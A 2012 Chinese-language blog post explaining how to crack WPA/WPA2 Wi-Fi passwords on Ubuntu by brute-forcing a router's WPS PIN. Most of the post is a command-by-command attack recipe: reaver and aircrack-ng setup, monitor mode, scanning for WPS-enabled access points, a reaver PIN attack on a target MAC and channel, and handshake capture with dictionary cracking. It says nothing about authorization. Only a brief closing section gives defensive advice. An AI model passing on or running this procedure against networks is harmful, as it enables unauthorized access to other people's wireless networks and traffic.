---
layout: post
category : all
tagline: "Supporting tagline"
tags: [thing, things]
title: "无线WIFI WPA/WPA2密码破解 for ubuntu"
date: 2012-09-13
---
前期工作    
\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=    
安装reaver 1.4：    
下载：    
<http://code.google.com/p/reaver\-wps/downloads/list>    
安装：    
./configure    
make    
sudo make install    
    
安装aircrack\-ng：    
sudo apt\-get install aircrack\-ng    
    
    
破解操作    
\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=    
sudo airmon\-ng start wlan0 (启动无线网卡的监控模式)(启动监控模式后接口是mon0)    
sudo wash \-i mon0 \-\-scan (搜索开启WPS的AP)    
sudo reaver \-i mon0 \-a \-S \-N \-d 0 \-t 5 \-vv \-b MAC \-c Channel (进行pin破解)    
参数简要说明：    
\-d 间隔时间    
\-vv 详细信息    
\-v 简单信息    
\-a 自动接上原来的进度    
\-S 优化PIN码    
\-N 关闭NACK    
\-t 超时 时间    
\-c 指定信道    
\-p 指定pin码    
\-b 目标MAC    
sudo airmon\-ng stop mon0 (破解完成后关闭监控模式)    
    
    
其他命令    
\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=    
sudo airodump\-ng mon0    
查看无线AP    
aircrack\-ng \-w 字典文件名 握手包文件名    
跑包    
sudo airodump\-ng mon0 \-d MAC \-c  Channel    
调天线    
    
    
破解原理    
\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=    
WPA/WPA2加密理论上不能破解，而reaver的pin破解是针对无线路由的WPS漏洞。    
WPS功能是无线路由上一串8位数字组合的pin码，用于快速连接WIFI。    
而8位数字的组合分为前四位和后三位，加一位校验码。    
所以前四位组合10000个，后三位组合1000个，共11000个pin码。    
通过逐一尝试得出前四位后，再尝试后三位，最后得到正确ping码，并连接取得WPA/WPA2密码。    
    
    
反破解建议    
\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=\=    
路由的WPS功能是可以关闭的，登录路由器关闭此功能即可。    
建议更改路由器的默认登录密码，因为除了pin破解外还有抓包破解等其他方法。    
当发现无线密码可能被破解后，迅速更改无线密码。